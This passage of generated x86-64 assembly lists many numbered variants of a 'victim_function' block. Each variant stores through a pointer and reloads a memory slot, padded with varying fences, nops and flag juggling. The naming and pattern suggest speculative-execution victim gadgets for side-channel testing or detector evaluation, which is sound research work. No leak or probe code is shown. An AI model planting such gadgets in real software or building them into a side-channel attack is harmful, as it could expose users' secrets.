	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2284
.Lvictim_function_win0_var2284:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2285
.Lvictim_function_win0_var2285:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2286
.Lvictim_function_win0_var2286:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2287
.Lvictim_function_win0_var2287:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2288
.Lvictim_function_win0_var2288:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2289
.Lvictim_function_win0_var2289:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2290
.Lvictim_function_win0_var2290:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2291
.Lvictim_function_win0_var2291:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2292
.Lvictim_function_win0_var2292:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2293
.Lvictim_function_win0_var2293:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2294
.Lvictim_function_win0_var2294:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2295
.Lvictim_function_win0_var2295:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2296
.Lvictim_function_win0_var2296:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2297
.Lvictim_function_win0_var2297:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2298
.Lvictim_function_win0_var2298:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2299
.Lvictim_function_win0_var2299:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2300
.Lvictim_function_win0_var2300:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2301
.Lvictim_function_win0_var2301:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2302
.Lvictim_function_win0_var2302:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2303
.Lvictim_function_win0_var2303:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2304
.Lvictim_function_win0_var2304:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	nop
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2305
.Lvictim_function_win0_var2305:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2306
.Lvictim_function_win0_var2306:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2307
.Lvictim_function_win0_var2307:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	nop
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2308
.Lvictim_function_win0_var2308:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2309
.Lvictim_function_win0_var2309:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2310
.Lvictim_function_win0_var2310:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2311
.Lvictim_function_win0_var2311:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2312
.Lvictim_function_win0_var2312:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2313
.Lvictim_function_win0_var2313:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2314
.Lvictim_function_win0_var2314:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2315
.Lvictim_function_win0_var2315:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	nop
	nop
	popfq
	mfence
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2316
.Lvictim_function_win0_var2316:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2317
.Lvictim_function_win0_var2317:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2318
.Lvictim_function_win0_var2318:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2319
.Lvictim_function_win0_var2319:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2320
.Lvictim_function_win0_var2320:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2321
.Lvictim_function_win0_var2321:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2322
.Lvictim_function_win0_var2322:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2323
.Lvictim_function_win0_var2323:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2324
.Lvictim_function_win0_var2324:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2325
.Lvictim_function_win0_var2325:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2326
.Lvictim_function_win0_var2326:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2327
.Lvictim_function_win0_var2327:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2328
.Lvictim_function_win0_var2328:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	nop
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2329
.Lvictim_function_win0_var2329:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2330
.Lvictim_function_win0_var2330:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2331
.Lvictim_function_win0_var2331:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2332
.Lvictim_function_win0_var2332:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2333
.Lvictim_function_win0_var2333:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2334
.Lvictim_function_win0_var2334:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2335
.Lvictim_function_win0_var2335:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2336
.Lvictim_function_win0_var2336:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2337
.Lvictim_function_win0_var2337:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2338
.Lvictim_function_win0_var2338:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2339
.Lvictim_function_win0_var2339:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	nop
	andq	$0, %r10
	nop
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2340
.Lvictim_function_win0_var2340:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2341
.Lvictim_function_win0_var2341:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2342
.Lvictim_function_win0_var2342:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2343
.Lvictim_function_win0_var2343:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	nop
	popfq
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2344
.Lvictim_function_win0_var2344:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2345
.Lvictim_function_win0_var2345:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2346
.Lvictim_function_win0_var2346:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2347
.Lvictim_function_win0_var2347:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2348
.Lvictim_function_win0_var2348:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2349
.Lvictim_function_win0_var2349:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2350
.Lvictim_function_win0_var2350:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2351
.Lvictim_function_win0_var2351:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2352
.Lvictim_function_win0_var2352:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2353
.Lvictim_function_win0_var2353:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2354
.Lvictim_function_win0_var2354:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2355
.Lvictim_function_win0_var2355:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2356
.Lvictim_function_win0_var2356:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2357
.Lvictim_function_win0_var2357:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2358
.Lvictim_function_win0_var2358:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2359
.Lvictim_function_win0_var2359:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2360
.Lvictim_function_win0_var2360:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2361
.Lvictim_function_win0_var2361:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2362
.Lvictim_function_win0_var2362:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2363
.Lvictim_function_win0_var2363:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2364
.Lvictim_function_win0_var2364:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2365
.Lvictim_function_win0_var2365:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	nop
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2366
.Lvictim_function_win0_var2366:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2367
.Lvictim_function_win0_var2367:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2368
.Lvictim_function_win0_var2368:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2369
.Lvictim_function_win0_var2369:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2370
.Lvictim_function_win0_var2370:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2371
.Lvictim_function_win0_var2371:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2372
.Lvictim_function_win0_var2372:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2373
.Lvictim_function_win0_var2373:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2374
.Lvictim_function_win0_var2374:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2375
.Lvictim_function_win0_var2375:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2376
.Lvictim_function_win0_var2376:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2377
.Lvictim_function_win0_var2377:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2378
.Lvictim_function_win0_var2378:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2379
.Lvictim_function_win0_var2379:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2380
.Lvictim_function_win0_var2380:
